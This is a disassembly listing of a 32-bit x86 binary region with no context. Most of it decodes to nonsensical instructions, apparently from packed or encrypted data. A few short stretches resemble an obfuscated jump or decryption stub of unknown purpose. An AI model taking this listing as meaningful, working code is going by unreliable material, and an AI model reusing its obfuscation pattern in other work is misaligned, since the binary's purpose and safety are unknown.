  402ffd:	inc    esi
  402ffe:	add    ebx,DWORD PTR [edi]
  403000:	jbe    0x402fa9
  403002:	jmp    0x70525290
  403007:	mov    WORD PTR [ebx+eax*8+0x37],ds
  40300b:	add    DWORD PTR [ecx+esi*1+0x2af7c79],0xab69345f
  403016:	scas   eax,DWORD PTR es:[edi]
  403017:	retf   
  403018:	mov    esp,0xb4c78097
  40301d:	aad    0x5e
  40301f:	push   ss
  403020:	mov    ebx,DWORD PTR [edi+eax*4+0x4dbf5aba]
  403027:	mov    bh,0x46
  403029:	imul   ebp,DWORD PTR [esi+ebx*1-0x6b30e361],0xffffff99
  403031:	jno    0x40308f
  403033:	popa   
  403034:	mov    dh,0x91
  403036:	mov    esi,0xee0200
  40303b:	iret   
  40303c:	fadd   DWORD PTR ds:0x585fac
  403042:	shl    BYTE PTR [esi],1
  403044:	push   cs
  403045:	or     eax,0x4f1652a8
  40304a:	mov    edx,0xc3cbbac8
  40304f:	ja     0x402ff8
  403051:	sar    ch,cl
  403053:	sub    edi,DWORD PTR [edx-0xf]
  403056:	mov    ecx,DWORD PTR [ecx-0x4]
  403059:	xchg   dl,al
  40305b:	iret   
  40305c:	and    dh,BYTE PTR [ebx]
  40305e:	mov    eax,ds:0x458b6665
  403063:	cld    
  403064:	jmp    0x403415
  403069:	jl     0x403082
  40306b:	sub    al,0xf7
  40306d:	jge    0x402ffc
  40306f:	jge    0x40306e
  403071:	inc    edx
  403072:	sbb    dh,BYTE PTR [ebx]
  403074:	fisttp DWORD PTR [esi-0x7c]
  403077:	ins    DWORD PTR es:[edi],dx
  403078:	dec    edx
  403079:	sahf   
  40307a:	sbb    bh,BYTE PTR [esi+0x7e]
  40307d:	xor    BYTE PTR [ecx+0x7e],0x7e
  403081:	test   eax,0xda5811c3
  403086:	fdiv   DWORD PTR [edx+ecx*4+0x54]
  40308a:	adc    BYTE PTR [edi+0x4d908e3f],ch
  403090:	xchg   BYTE PTR [ebp-0x26],dl
  403093:	sub    BYTE PTR [edx+0x7ece6fe5],bl
  403099:	push   edi
  40309a:	int3   
  40309b:	push   es
  40309c:	cmp    BYTE PTR [esi+0x24],bh
  40309f:	jmp    0x927ac3d4
  4030a4:	and    esp,ecx
  4030a6:	mov    ah,0x67
  4030a8:	(bad)  [ebp-0x3f25c68b]
  4030ae:	nop
  4030af:	jno    0x403100
  4030b1:	jne    0x4030ba
  4030b3:	dec    ebp
  4030b4:	and    eax,0x703526d
  4030b9:	sbb    al,0x55
  4030bb:	loope  0x403125
  4030bd:	add    BYTE PTR [edx],cl
  4030bf:	mov    ds:0xdded9b7,al
  4030c4:	lds    eax,FWORD PTR ss:[ebx]
  4030c7:	ins    DWORD PTR es:[edi],dx
  4030c8:	jns    0x4030d5
  4030ca:	in     eax,dx
  4030cb:	pop    esp
  4030cc:	sub    ah,0x40
  4030cf:	sbb    al,0x32
  4030d1:	pop    ebx
  4030d2:	ins    BYTE PTR es:[edi],dx
  4030d3:	outs   dx,DWORD PTR ds:[esi]
  4030d4:	fidiv  DWORD PTR [edi-0x31a30315]
  4030da:	jmp    0x7379:0x1b863b4a
  4030e1:	jno    0x403072
  4030e3:	aam    0x33
  4030e5:	push   esi
  4030e6:	xchg   esp,eax
  4030e7:	jae    0x4030f7
  4030e9:	daa    
  4030ea:	push   cs
  4030eb:	shl    bl,1
  4030ed:	mov    eax,ds:0x7a88befb
  4030f2:	pop    edx
  4030f3:	inc    esi
  4030f4:	xor    eax,0xb02b8af2
  4030f9:	xchg   DWORD PTR [edx+ebp*8],esi
  4030fc:	out    dx,eax
  4030fd:	cmp    ebp,ebp
  4030ff:	push   0xfffffff8
  403101:	xor    al,0xd5
  403103:	push   edx
  403104:	cmc    
  403105:	or     BYTE PTR [ecx+ebp*8+0x5280f265],cl
  40310c:	mov    ebx,0xab72bcfd
  403111:	jp     0x403154
  403113:	mov    dl,0x21
  403115:	sti    
  403116:	add    ebp,eax
  403118:	in     eax,dx
  403119:	jl     0x40312c
  40311b:	fisubr DWORD PTR [eax+0x1a95278c]
  403121:	and    al,0x7a
  403123:	out    0xd7,al
  403125:	or     BYTE PTR [esi+0x7e],dh
  403128:	inc    ebp
  403129:	xchg   ebp,eax
  40312a:	imul   ebp,DWORD PTR ds:0x9c8b9ef0,0x48
  403131:	repnz lds ecx,FWORD PTR [edi-0x2d]
  403135:	inc    esi
  403136:	or     BYTE PTR [eax],al
  403138:	fistp  QWORD PTR [eax-0x3b6a89bf]
  40313e:	mov    ebx,0xd29a772c
  403143:	push   cs
  403144:	dec    edx
  403145:	loop   0x4030cc
  403147:	jle    0x403146
  403149:	push   esp
  40314a:	je     0x403169
  40314c:	xchg   DWORD PTR ds:0x6c34bfc7,edi
  403152:	xor    BYTE PTR [ebp+0x5e9cffb4],dl
  403158:	scas   al,BYTE PTR es:[edi]
  403159:	call   0xc5a8e9ed
  40315e:	pusha  
  40315f:	jno    0x403170
  403161:	ins    BYTE PTR es:[edi],dx
  403162:	push   0xffffff86
  403164:	(bad)  
  403165:	cmp    dh,BYTE PTR [esi+0x199caf58]
  40316b:	sub    al,0x94
  40316d:	in     al,dx
  40316e:	cld    
  40316f:	nop
  403170:	push   0xfabae46
  403175:	cli    
  403176:	pop    ecx
  403177:	es inc ecx
  403179:	(bad)  
  40317b:	fadd   DWORD PTR [edi-0x24e52ab5]
  403181:	test   DWORD PTR [edi-0x1556df85],ebx
  403187:	nop
  403188:	inc    ecx
  403189:	sbb    ebx,edx
  40318b:	dec    eax
  40318c:	xchg   edx,eax
  40318d:	mov    esp,0xebabed8f
  403192:	mov    esi,0xa91447dc
  403197:	xchg   esp,eax
  403198:	pop    eax
  403199:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40319a:	les    esi,FWORD PTR [eax-0x69]
  40319d:	cld    
  40319e:	fsubr  QWORD PTR ds:0x69ea3d77
  4031a4:	jmp    ecx
  4031a6:	add    al,0x20
  4031a8:	psubusw mm3,QWORD PTR [esi-0x70]
  4031ac:	test   BYTE PTR [eax-0x27],cl
  4031af:	push   ebx
  4031b0:	into   
  4031b1:	jno    0x40315d
  4031b3:	push   ds
  4031b4:	addr16 jge 0x403177
  4031b7:	inc    esp
  4031b8:	test   DWORD PTR [ecx-0x36854ec4],ebx
  4031be:	and    eax,0x833edf5e
  4031c3:	inc    edi
  4031c4:	retf   
  4031c5:	push   edx
  4031c6:	mov    ebx,0x25dd64bf
  4031cb:	mov    ecx,0xf1abcaec
  4031d0:	loope  0x403226
  4031d2:	stc    
  4031d3:	push   es
  4031d4:	imul   ecx,DWORD PTR gs:[esi+0x4],0x64
  4031d9:	jnp    0x4031ca
  4031db:	test   eax,0x41af49d4
  4031e0:	adc    BYTE PTR [ecx+0x29],dl
  4031e3:	dec    edi
  4031e4:	xor    eax,0xd4ce58a1
  4031e9:	dec    esi
  4031ea:	mov    dl,0x0
  4031ec:	jmp    0xd91a19ba
  4031f1:	jae    0x403244
  4031f3:	push   ecx
  4031f4:	icebp  
  4031f5:	jnp    0x4031c2
  4031f7:	dec    edx
  4031f8:	in     al,dx
  4031f9:	call   0x590c:0x8d84914e
  403200:	and    edx,DWORD PTR [edx+0x7392ce5b]
  403206:	sbb    eax,0x2c1376e7
  40320b:	pop    eax
  40320c:	jecxz  0x4031fa
  40320e:	mov    ebx,0xb5c4dc28
  403213:	hlt    
  403214:	pop    ebx
  403215:	mov    WORD PTR [ebx+ecx*4-0x5b],cs
  403219:	ret    0xf6f0
  40321c:	xor    eax,DWORD PTR [esi]
  40321e:	adc    ebp,ecx
  403220:	scas   al,BYTE PTR es:[edi]
  403221:	mov    ds:0x32b9d1f3,eax
  403226:	in     eax,dx
  403227:	loopne 0x4031d2
  403229:	jle    0x4032a6
  40322b:	in     eax,0x3c
  40322d:	cwde   
  40322e:	fadd   QWORD PTR [edx-0x76]
  403231:	or     al,0x6c
  403233:	cmp    BYTE PTR [edi-0x3dbcbaa4],cl
  403239:	les    esp,FWORD PTR [ebp-0x49c933f3]
  40323f:	mov    bh,bl
  403241:	mov    ebx,0x2a7cab46
  403246:	push   ss
  403247:	cmc    
  403248:	out    dx,al
  403249:	arpl   WORD PTR [eax],bx
  40324b:	push   ecx
  40324c:	mov    ebp,0x41b9f049
  403251:	ret    0x47ef
  403254:	jge    0x403289
  403256:	push   es
  403257:	mov    ecx,0x5ee58c93
  40325c:	jbe    0x4032a6
  40325e:	mov    edi,0xcdfd9958
  403263:	pop    esi
  403264:	into   
  403265:	shl    bl,1
  403267:	xchg   BYTE PTR [ebx+esi*4-0x66de1c5b],dl
  40326e:	imul   ebp,DWORD PTR [ebp-0x12ee7bd5],0xb2d6bc03
  403278:	mov    edi,0xfba6b525
  40327d:	leave  
  40327e:	sar    BYTE PTR [eax+0x49],0xc3
  403282:	(bad)  
  403283:	pop    edi
  403284:	out    0x62,al
  403286:	inc    edx
  403287:	sub    esi,DWORD PTR [eax]
  403289:	int    0x96
  40328b:	xlat   BYTE PTR ds:[ebx]
  40328c:	xor    BYTE PTR [ebx],bh
  40328e:	cwde   
  40328f:	and    DWORD PTR [ebp+0x40d9f03f],0xffffff88
  403296:	jp     0x40326a
  403298:	push   ebp
  403299:	sbb    al,0x1c
  40329b:	or     DWORD PTR [eax],ecx
  40329d:	fcom   DWORD PTR [ebx-0x4f]
  4032a0:	inc    esp
  4032a1:	fadd   DWORD PTR [eax+0x196f4b16]
  4032a7:	leave  
  4032a8:	(bad)  
  4032a9:	fsub   QWORD PTR [ecx]
  4032ab:	xor    eax,DWORD PTR [ecx-0xe]
  4032ae:	pop    edi
  4032af:	jbe    0x403238
  4032b1:	add    DWORD PTR [edx+0x5d],edi
  4032b4:	add    BYTE PTR [esi],bl
  4032b6:	gs push ebx
  4032b8:	aam    0x90
  4032ba:	inc    ebx
  4032bb:	xor    bl,BYTE PTR [eax+0x16]
  4032be:	jmp    0x860b:0x35b1dc0c
  4032c5:	xlat   BYTE PTR ds:[ebx]
  4032c6:	fst    DWORD PTR [esi]
  4032c8:	adc    BYTE PTR [esi+edi*4],dh
  4032cb:	(bad)  
  4032cc:	sub    al,0x22
  4032ce:	xor    al,0x6
  4032d0:	and    edx,DWORD PTR [eax+0x15]
  4032d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4032d4:	int3   
  4032d5:	cmp    eax,0x536a22d5
  4032da:	inc    edx
  4032db:	xchg   esp,eax
  4032dc:	mov    dh,0xd6
  4032de:	int    0xc8
  4032e0:	adc    bl,dh
  4032e2:	xchg   ebx,eax
  4032e3:	ds ja  0x403309
  4032e6:	sahf   
  4032e7:	jmp    FWORD PTR [ebp-0x470a15e6]
  4032ed:	loop   0x403288
  4032ef:	add    eax,0x863ce975
  4032f4:	int    0x46
  4032f6:	fst    QWORD PTR [esi]
  4032f8:	ja     0x4032d9
  4032fa:	sbb    BYTE PTR [edx+0x78cb185b],dl
  403300:	cwde   
  403301:	ds dec ebx
  403303:	jecxz  0x4032b8
  403305:	dec    ecx
  403306:	loope  0x4032b5
  403308:	inc    ecx
  403309:	in     eax,dx
  40330a:	inc    DWORD PTR [eax+0x43206388]
  403310:	pop    edx
  403311:	sbb    ecx,DWORD PTR ss:[edx]
  403314:	ds mov bh,0xc0
  403317:	cmp    eax,0x1855c135
  40331c:	xor    ebp,DWORD PTR [ebp-0x1d]
  40331f:	cmp    ebp,DWORD PTR es:[ebx+0x60]
  403323:	test   BYTE PTR [eax+0x24ddbe84],dh
  403329:	rol    DWORD PTR ds:0x118af17f,0x69
  403330:	addr16 mov edi,0x1c9a1774
  403336:	int    0xf5
  403338:	loopne 0x403320
  40333a:	test   BYTE PTR [esi],dl
  40333c:	clc    
  40333d:	shl    BYTE PTR [edi+edx*4-0x7b],1
  403341:	push   0xca70e1b
  403346:	mov    edi,DWORD PTR [ebp-0x35]
  403349:	dec    ebx
  40334a:	adc    BYTE PTR [ecx-0x45],dh
  40334d:	fdiv   DWORD PTR [edi-0x52]
  403350:	inc    ecx
  403351:	mov    WORD PTR [ebx],es
  403353:	cmp    edx,ebp
  403355:	and    edx,DWORD PTR [ebp+0x1cf7121a]
  40335b:	sub    al,0x81
  40335d:	mov    DWORD PTR [ebp-0x3486b74a],ecx
  403363:	sub    eax,0x4230547d
  403368:	xchg   ebp,eax
  403369:	jmp    esp
  40336b:	das    
  40336c:	xlat   BYTE PTR ds:[ebx]
  40336d:	inc    edi
  40336e:	(bad)  
  40336f:	pop    esp
  403370:	nop    ebx
  403373:	imul   edx,DWORD PTR [ebx],0x4b
  403376:	sbb    bl,dl
  403378:	mov    ch,0x30
  40337b:	jp     0x4033e4
  40337d:	(bad)  
  40337e:	ja     0x403388
  403380:	push   es
  403381:	in     eax,0xe3
  403383:	sbb    ch,BYTE PTR [edi-0x575871d6]
  403389:	call   0xb3c9cb3b
  40338e:	push   edx
  40338f:	xchg   edx,eax
  403390:	xchg   esp,eax
  403391:	vunpcklpd ymm2,ymm6,YMMWORD PTR [edx+edx*8-0x371f9d0b]
  40339a:	ss dec edx
  40339c:	mov    ch,bl
  40339e:	idiv   DWORD PTR [edi]
  4033a0:	jg     0x4033b6
  4033a2:	mov    dh,0xae
  4033a4:	fcmovnu st,st(6)
  4033a6:	out    0x2d,al
  4033a8:	mov    ch,0x74
  4033aa:	mov    dh,0xd3
  4033ac:	pop    esp
  4033ad:	jbe    0x403347
  4033af:	push   ebx
  4033b0:	aaa    
  4033b1:	ins    DWORD PTR es:[edi],dx
  4033b2:	test   al,0x4b
  4033b4:	mov    dh,0x65
  4033b6:	xor    al,0x74
  4033b8:	pop    ss
  4033b9:	and    BYTE PTR [esi-0x2],ah
  4033bc:	xor    BYTE PTR [ecx],cl
  4033be:	jl     0x403400
  4033c0:	jecxz  0x4033be
  4033c2:	loope  0x4033de
  4033c4:	inc    edx
  4033c5:	out    0xa2,al
  4033c7:	and    BYTE PTR [edi+ebx*4+0x778892e8],al
  4033ce:	cmp    BYTE PTR [edi-0x44],0x8a
  4033d2:	ret    
  4033d3:	pop    ecx
  4033d4:	add    BYTE PTR [eax+0x214df8d6],bl
  4033da:	repz scas eax,DWORD PTR es:[edi]
  4033dc:	sbb    eax,0x56b9e9a9
  4033e1:	mov    WORD PTR [ecx-0x28],?
  4033e4:	test   eax,0xdcd21b2d
  4033e9:	cmp    BYTE PTR [edi+0x72293cc5],cl
  4033ef:	dec    eax
  4033f0:	ins    BYTE PTR es:[edi],dx
  4033f1:	xchg   ebp,eax
  4033f2:	ja     0x4033ca
  4033f4:	fisttp WORD PTR [ebx-0x21066fb9]
  4033fa:	imul   edx,DWORD PTR [edi+ebx*2+0x364f9259],0xffffffc4
  403402:	bts    DWORD PTR [ecx-0x4f],esi
  403406:	inc    esp
  403407:	ret    
  403408:	or     edx,DWORD PTR [ecx-0x54747901]
  40340e:	xchg   BYTE PTR [edi+0x50e5d20],al
  403414:	test   BYTE PTR [ebx+0x3f8b087d],cl
  40341a:	mov    edx,0x8a40
  40341f:	xor    ax,dx
  403422:	jmp    0x4037d3
  403427:	nop
  403428:	cdq    
  403429:	fst    QWORD PTR [ecx-0x6683aa03]
  40342f:	xlat   BYTE PTR ds:[ebx]
  403430:	push   cs
  403431:	mov    cl,0xfe
  403433:	jge    0x403474
  403435:	cmp    DWORD PTR [esi+0x7e7e1e22],esp
  40343b:	xor    BYTE PTR [ecx+0x7e],0x7e
  40343f:	fiadd  DWORD PTR [ebx+eax*1-0x25]
  403443:	xchg   ecx,eax
  403444:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403445:	rcl    bl,cl
  403447:	ja     0x403441
  403449:	add    eax,0xf98c75e8
  40344e:	xchg   edi,eax
  40344f:	ret    
  403450:	xor    DWORD PTR [edx+esi*4-0x4e608069],ebx
  403457:	je     0x40344c
  403459:	lds    edx,FWORD PTR [esi-0x16]
  40345c:	push   esp
  40345d:	movzx  ebx,sp
  403460:	je     0x4034c2
  403462:	cmp    BYTE PTR [eax],0xa7
  403465:	xor    al,0x2b
  403467:	fmul   st(0),st
  403469:	sbb    bl,dl
  40346b:	(bad)  [eax]
  40346d:	jecxz  0x4034c3
  40346f:	pusha  
  403470:	ins    DWORD PTR es:[edi],dx
  403471:	push   esp
  403472:	dec    edi
  403473:	addr16 mov dh,0xb0
  403476:	mov    dh,0x8d
  403478:	ins    DWORD PTR es:[edi],dx
  403479:	ins    BYTE PTR es:[edi],dx
  40347a:	push   edx
  40347b:	jmp    0xf1e7b15d
  403480:	and    edi,DWORD PTR [edi-0x7e5c8eae]
  403486:	pusha  
  403487:	dec    ecx
  403488:	jge    0x40345c
  40348a:	inc    esp
  40348b:	cwde   
  40348c:	mov    esp,0xd2ac177a
  403491:	popf   
  403492:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403493:	jne    0x4034e9
  403495:	int3   
  403496:	sub    ah,BYTE PTR [eax]
  403498:	and    BYTE PTR [ecx+0x3b35568d],bl
  40349e:	cmp    DWORD PTR [ebx+0x75],edx
  4034a1:	push   ss
  4034a2:	outs   dx,DWORD PTR ds:[esi]
  4034a3:	inc    edi
  4034a4:	push   0x35
  4034a6:	adc    ch,BYTE PTR [ebx]
  4034a8:	xor    eax,0x312c9352
  4034ad:	mov    ah,0xc1
  4034af:	add    ebp,0x8e6aa43f
  4034b5:	or     dl,BYTE PTR [edi]
  4034b7:	out    dx,al
  4034b8:	sub    cl,BYTE PTR [eax]
  4034ba:	ret    
  4034bb:	dec    ecx
  4034bc:	ins    DWORD PTR es:[edi],dx
  4034bd:	or     bl,BYTE PTR [esi]
  4034bf:	jo     0x403536
  4034c1:	enter  0x8f6f,0xe0
  4034c5:	adc    ebx,DWORD PTR gs:[edi]
  4034c8:	sub    DWORD PTR ds:0xaa73a9a6,ebp
  4034ce:	sub    BYTE PTR ds:0x840373,al
  4034d4:	repz sub esp,ebp
  4034d7:	push   es
  4034d8:	inc    ebp
  4034d9:	xchg   ebp,eax
  4034da:	inc    ebp
  4034db:	stos   BYTE PTR es:[edi],al
  4034dc:	popa   
  4034dd:	mov    eax,0xdb8f2700
  4034e2:	inc    esp
  4034e3:	sbb    eax,0x30df16be
  4034e8:	icebp  
  4034e9:	out    dx,eax
  4034ea:	inc    ebx
  4034eb:	popf   
  4034ec:	and    ecx,DWORD PTR [ebx+0x45]
  4034ef:	shl    BYTE PTR [esi-0x77],0xcc
  4034f3:	(bad)  
  4034f4:	shr    cl,0x2e
  4034f7:	xor    BYTE PTR [edi+0x50dc7a07],cl
  4034fd:	inc    ebp
  4034fe:	mov    bh,ah
  403500:	stc    
  403501:	call   0xbb84597f
  403506:	or     ebx,DWORD PTR [edi-0x6dd85399]
  40350c:	adc    cl,0x2
  40350f:	pop    ebx
  403510:	out    0xa3,eax
  403512:	push   ss
  403513:	cmp    al,0x51
  403515:	jl     0x403567
  403517:	into   
  403518:	push   ss
  403519:	adc    bh,bl
  40351b:	sbb    al,0xa6
  40351d:	push   ebp
  40351e:	cmc    
  40351f:	xor    dh,bl
  403521:	bound  ebp,QWORD PTR [edi]
  403523:	push   esi
  403524:	push   es
  403525:	push   ss
  403526:	inc    eax
  403527:	or     al,0xcb
  403529:	mov    eax,ds:0x694ce
  40352e:	fucomp st(5)
  403530:	enter  0xa6ab,0x8
  403534:	data16 fwait
  403536:	inc    ebp
  403537:	fcmove st,st(3)
  403539:	dec    edx
  40353a:	pop    ds
  40353b:	mov    ecx,0x23a4ea7f
  403540:	push   0x2e8a74a
  403545:	or     ah,BYTE PTR [edi+0x59]
  403548:	sbb    eax,0x3a59ca5a
  40354d:	clc    
  40354e:	cmp    BYTE PTR [edi+0x3908b078],0xf7
  403555:	mov    ch,BYTE PTR [eax-0x6b]
  403558:	mov    esi,DWORD PTR [ebx]
  40355a:	out    dx,al
  40355b:	in     al,dx
  40355c:	(bad)
  40355f:	nop
  403560:	adc    ebx,DWORD PTR [esp+ecx*4]
  403563:	call   0xc710:0x1d9d5a95
  40356a:	and    eax,0x5fc3dd81
  40356f:	push   ebx
  403570:	enter  0x2041,0xd3
  403574:	xchg   ebp,eax
  403575:	popa   
  403576:	adc    eax,0x6f437db0
  40357b:	jns    0x4035cf
  40357d:	scas   eax,DWORD PTR es:[edi]
  40357e:	arpl   WORD PTR [ecx+0x10],si
  403581:	and    al,0x13
  403583:	dec    ecx
  403584:	repnz in eax,dx
  403586:	cmp    DWORD PTR [edx],0x6d
  403589:	stc    
  40358a:	repnz xchg ebp,eax
  40358c:	ins    WORD PTR es:[edi],dx
  40358e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40358f:	xor    BYTE PTR [eax+edi*8+0x11],dl
  403593:	adc    DWORD PTR [ebx],0x12
  403596:	jmp    0x88d6b444
  40359b:	add    BYTE PTR [edi+0xc1d8aca],0xb8
  4035a2:	cmp    BYTE PTR [eax-0x3305c5f9],ch
  4035a8:	pop    ds
  4035a9:	enter  0xa805,0x19
  4035ad:	daa    
  4035ae:	add    al,0xcf
  4035b0:	mov    ebx,DWORD PTR [ecx+0x5f6d4aeb]
  4035b6:	jle    0x4035c2
  4035b8:	or     ah,BYTE PTR [ebx+0x50dd49d6]
  4035be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4035bf:	idiv   DWORD PTR ds:0xf118e449
  4035c5:	xchg   ebp,eax
  4035c6:	or     bh,0x11
  4035c9:	out    dx,eax
  4035ca:	retf   
  4035cb:	ins    BYTE PTR es:[edi],dx
  4035cc:	pop    edx
  4035cd:	je     0x403558
  4035cf:	sub    cl,BYTE PTR [bp+0x58f]
  4035d4:	jl     0x4035e8
  4035d6:	lahf   
  4035d7:	mov    WORD PTR [ebp+eax*8-0x5e],es
  4035db:	in     al,0x66
  4035dd:	dec    ebx
  4035de:	shr    ah,1
  4035e0:	jnp    0x4035ce
  4035e2:	pop    ecx
  4035e3:	jbe    0x40362f
  4035e5:	jmp    FWORD PTR [esi]
  4035e7:	adc    ch,BYTE PTR [ebx]
  4035e9:	dec    edi
  4035ea:	xor    BYTE PTR ds:0xea11dcb6,0xa6
  4035f1:	xlat   BYTE PTR ds:[ebx]
  4035f2:	mov    ch,dl
  4035f4:	sbb    cl,BYTE PTR [ecx-0x28]
  4035f7:	leave  
  4035f8:	add    BYTE PTR [esi+0x45a7d0e],0xb2
  4035ff:	add    BYTE PTR [edi-0x60119a6e],dl
  403605:	aaa    
  403606:	out    dx,eax
  403607:	nop
  403608:	stc    
  403609:	xor    eax,0x657d0df5
  40360e:	cmc    
  40360f:	lock xchg esp,eax
  403611:	dec    ebx
  403612:	mov    al,ds:0xa0d0e5d
  403617:	dec    esi
  403618:	push   edx
  403619:	pop    ebx
  40361a:	cmp    edx,DWORD PTR [ecx+0x4304bf54]
  403620:	inc    esp
  403621:	sub    DWORD PTR [edx+0x7019d43],esp
  403627:	test   DWORD PTR [ebx+0x7a],ebp
  40362a:	ror    ebp,1
  40362c:	repnz add esp,ecx
  40362f:	fdiv   st,st(1)
  403631:	ret    0x5c40
  403634:	dec    ebp
  403635:	push   ecx
  403636:	test   al,0xb6
  403638:	adc    al,0x92
  40363a:	dec    esi
  40363b:	in     al,0x31
  40363d:	mov    ah,0xc0
  40363f:	mov    ds:0xd883fa61,eax
  403644:	adc    al,0x92
  403646:	gs xchg ecx,eax
  403648:	repnz cld 
  40364a:	xchg   ecx,eax
  40364b:	imul   edx,DWORD PTR [eax],0xffffffaa
  40364e:	jmp    0x40369e
  403650:	rcr    BYTE PTR [ecx-0x75e0f151],cl
  403656:	sub    eax,0x292162d1
  40365b:	scas   al,BYTE PTR es:[edi]
  40365c:	hlt    
  40365d:	mov    ebx,0xdda8d17c
  403662:	pop    eax
  403663:	cli    
  403664:	gs in  eax,dx
  403666:	stos   BYTE PTR es:[edi],al
  403667:	push   ds
  403668:	mov    bh,0x22
  40366a:	mul    DWORD PTR [eax-0x44]
  40366d:	pop    edx
  40366e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40366f:	cmc    
  403670:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403671:	xchg   ecx,eax
  403672:	add    DWORD PTR [esi+0x1de7f2b4],eax
  403678:	pop    edi
  403679:	fsub   QWORD PTR [ecx]
  40367b:	push   cs
  40367c:	adc    bl,BYTE PTR [ecx+0x3]
  40367f:	mov    al,ds:0x283add98
  403684:	sbb    dl,BYTE PTR [ecx-0x2ee7dae8]
  40368a:	mov    ds:0x16a6f94f,al
  40368f:	dec    eax
  403690:	mov    ds:0xb481476d,eax
  403695:	gs mov ebx,0xfb0fecc7
  40369b:	js     0x40368a
  40369d:	cmp    BYTE PTR [ecx],dh
  40369f:	popf   
  4036a0:	pop    ecx
  4036a1:	shl    DWORD PTR [ebx],0xde
  4036a4:	jge    0x40363f
  4036a6:	div    BYTE PTR [ecx+0x41]
  4036a9:	dec    ebp
  4036aa:	jo     0x40367e
  4036ac:	int    0x7b
  4036ae:	or     eax,0xa7864230
  4036b3:	push   es
  4036b4:	sub    dh,BYTE PTR [edx]
  4036b6:	int    0xa6
  4036b8:	fstp   DWORD PTR [edi-0x796c88f8]
  4036be:	and    BYTE PTR [esi+0x53],ah
  4036c1:	fsub   DWORD PTR [edx+0x766fd15]
  4036c7:	xor    esp,DWORD PTR [ecx-0x49]
  4036ca:	and    dh,bl
  4036cc:	fisubr WORD PTR [edi]
  4036ce:	xchg   DWORD PTR [eax-0x32e0cc05],ebx
  4036d4:	mov    edx,0x3120a92b
  4036d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4036da:	inc    edi
  4036db:	ss (bad) 
  4036dd:	js     0x403687
  4036df:	inc    edi
  4036e0:	(bad)  
  4036e1:	sub    BYTE PTR [esi+edi*8-0x323704f7],dl
  4036e8:	popa   
  4036e9:	aas    
  4036ea:	in     eax,0xc0
  4036ec:	out    0xda,al
  4036ee:	fistp  QWORD PTR [eax-0x36ef1f70]
  4036f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4036f6:	inc    esp
  4036f7:	pop    eax
  4036f8:	mov    bh,0x9c
  4036fa:	push   ebx
  4036fb:	nop
  4036fc:	scas   eax,DWORD PTR es:[edi]
  4036fd:	aaa    
  4036fe:	push   0xbe46b2d9
  403703:	lods   al,BYTE PTR ds:[esi]
  403704:	adc    esi,DWORD PTR [edi]
  403706:	das    
  403707:	pop    ebx
  403708:	ret    
  403709:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40370a:	mov    al,ds:0xd4bd76bb
  40370f:	pop    esp
  403710:	outs   dx,BYTE PTR ds:[esi]
  403711:	dec    edi
  403712:	sbb    BYTE PTR [eax-0x7826df2e],dh
  403718:	cmp    eax,0x96cc143b
  40371d:	mov    ebp,0xc614e2cb
  403722:	cmc    
  403723:	sub    al,0xc6
  403725:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403726:	jge    0x40378a
  403728:	mov    dh,cl
  40372a:	xor    ebp,DWORD PTR [ecx+0x1a]
  40372d:	cmp    dl,al
  40372f:	mov    dh,0x75
  403731:	mov    edx,0xfb04500c
  403736:	mov    al,0x9c
  403738:	or     DWORD PTR [edx-0x32],edx
  40373b:	mov    dh,0x45
  40373d:	mov    eax,ds:0x9102e7e3
  403742:	sbb    al,0xee
  403744:	pop    ebp
  403745:	inc    BYTE PTR [edi-0x77]
  403748:	in     eax,0xcf
  40374a:	out    0xa2,al
  40374c:	pop    ss
  40374d:	xchg   eax,ebx
  40374f:	jmp    0x4037ab
  403751:	les    ecx,FWORD PTR [edx-0x2789e656]
  403757:	jns    0x40376a
  403759:	sub    BYTE PTR [esi+esi*8+0x368cb3d7],0xe8
  403761:	mov    dh,cl
  403763:	es mov dh,0xcd
  403766:	and    al,dh
  403768:	fcomip st,st(7)
  40376a:	dec    ebp
  40376b:	add    ebx,esi
  40376d:	int3   
  40376e:	test   al,0x11
  403770:	out    0xae,eax
  403772:	pop    eax
  403773:	lods   al,BYTE PTR ds:[esi]
  403774:	stos   BYTE PTR es:[edi],al
  403775:	fiadd  DWORD PTR [edx-0x6f6b93cb]
  40377b:	in     al,dx
  40377c:	jnp    0x403739
  40377e:	adc    DWORD PTR [ebx+0x4d],ebx
  403781:	mov    eax,0x63c4c037
  403786:	pop    ss
  403787:	stos   BYTE PTR es:[edi],al
  403788:	cmp    ah,dh
  40378a:	inc    esp
  40378b:	mov    al,0x1d
  40378d:	pop    edx
  40378e:	mov    ch,0xa0
  403790:	jle    0x4037c9
  403792:	push   ds
  403793:	xor    ebp,DWORD PTR [edi]
  403795:	imul   ecx,ebp,0xe7cf7bcb
  40379b:	cmp    eax,0x6e238377
  4037a0:	adc    DWORD PTR [esi+0x5100e51c],0x1f0f496e
  4037aa:	aam    0x49
  4037ac:	data16 mov bl,0xc2
  4037af:	jle    0x403785
  4037b1:	sub    DWORD PTR [eax],esp
  4037b3:	retf   0xcf7b
  4037b6:	cld    
  4037b7:	push   0xb938e3f0
  4037bc:	sbb    esi,DWORD PTR [ebx]
  4037be:	cmp    ecx,esp
  4037c0:	pusha  
  4037c1:	push   edi
  4037c2:	push   0xffffffb6
  4037c4:	jb     0x403802
  4037c6:	push   edi
  4037c7:	xchg   ebp,eax
  4037c8:	push   cs
  4037c9:	loopne 0x40380d
  4037cb:	gs cli 
  4037cd:	cmp    esp,DWORD PTR [ecx-0x401d3615]
  4037d3:	mov    edx,0x3b06
  4037d8:	add    ax,dx
  4037db:	cmp    ax,WORD PTR [edi]
  4037de:	je     0x40382b
  4037e4:	mov    eax,DWORD PTR [ebp-0x14]
  4037e7:	xor    eax,ecx
  4037e9:	add    eax,esi
  4037eb:	mov    DWORD PTR [ebp-0x24],eax
  4037ee:	mov    eax,DWORD PTR [ebp-0x28]
